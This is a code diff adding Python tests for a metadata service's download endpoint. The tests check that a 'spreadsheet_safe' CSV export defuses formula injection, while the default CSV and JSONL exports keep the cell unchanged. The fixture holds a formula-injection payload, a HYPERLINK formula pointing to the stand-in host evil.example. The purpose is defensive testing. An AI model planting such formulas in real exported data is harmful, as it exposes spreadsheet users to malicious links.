@@ -7,7 +7,10 @@ so they work on an export nobody has mapped yet.
 from __future__ import annotations
 
 import gzip
+import io
 import json
+
+import pandas as pd
 
 HEADERS = {"X-API-Key": "test-key"}
 
@@ -17,6 +20,18 @@ CSV = (
     b"2;Photosynthese;2009;disc/080\n"
     b"3;Wiener Kongress;2020;hoch/1\n"
 )
+
+# A title as harvested metadata can hold it: a spreadsheet runs it as a formula.
+HYPERLINK = '=HYPERLINK("http://evil.example","click")'
+FORMULA_CSV = (
+    'id;titel\n1;"=HYPERLINK(""http://evil.example"",""click"")"\n'
+).encode("utf-8")
+
+
+def _title_of(csv_text: str) -> str:
+    """The title cell, read back the way any consumer of the file would."""
+    return str(pd.read_csv(io.StringIO(csv_text), sep=";", dtype=str,
+                           keep_default_na=False)["titel"][0])
 
 
 def _client_with_data(make_client, payload: bytes = CSV, name: str = "src"):
@@ -154,6 +169,30 @@ class TestDownload:
         r = client.get("/refine/src/download?format=csv.gz", headers=HEADERS)
         assert gzip.decompress(r.content).decode("utf-8").startswith("id;titel")
         assert "src.csv.gz" in r.headers["content-disposition"]
+
+    def test_the_spreadsheet_variant_is_defused_and_named_apart(self, make_client):
+        """Asked for by someone who wants to open the dataset in Excel or
+        LibreOffice; its own name keeps it apart from the api_v3 CSV beside it."""
+        client = _client_with_data(make_client, FORMULA_CSV)
+        r = client.get("/refine/src/download?spreadsheet_safe=true", headers=HEADERS)
+        assert r.status_code == 200, r.text
+        assert _title_of(r.text) == f"'{HYPERLINK}"
+        assert "src.spreadsheet.csv" in r.headers["content-disposition"]
+
+    def test_the_default_download_carries_the_cell_as_it_is(self, make_client):
+        """The default is the file api_v3 reads and the workbench imports back."""
+        client = _client_with_data(make_client, FORMULA_CSV)
+        r = client.get("/refine/src/download", headers=HEADERS)
+        assert _title_of(r.text) == HYPERLINK
+        assert "src.csv" in r.headers["content-disposition"]
+
+    def test_a_json_download_keeps_its_name_when_the_flag_is_set(self, make_client):
+        """The flag has nothing to do in JSON, so neither the file nor its name
+        pretends it was defused."""
+        client = _client_with_data(make_client, FORMULA_CSV)
+        r = client.get("/refine/src/download?format=jsonl&spreadsheet_safe=true", headers=HEADERS)
+        assert json.loads(r.text.splitlines()[0])["titel"] == HYPERLINK
+        assert "src.jsonl" in r.headers["content-disposition"]
 
     def test_an_unsupported_format_is_a_400_naming_what_is_supported(self, make_client):
         client = _client_with_data(make_client)
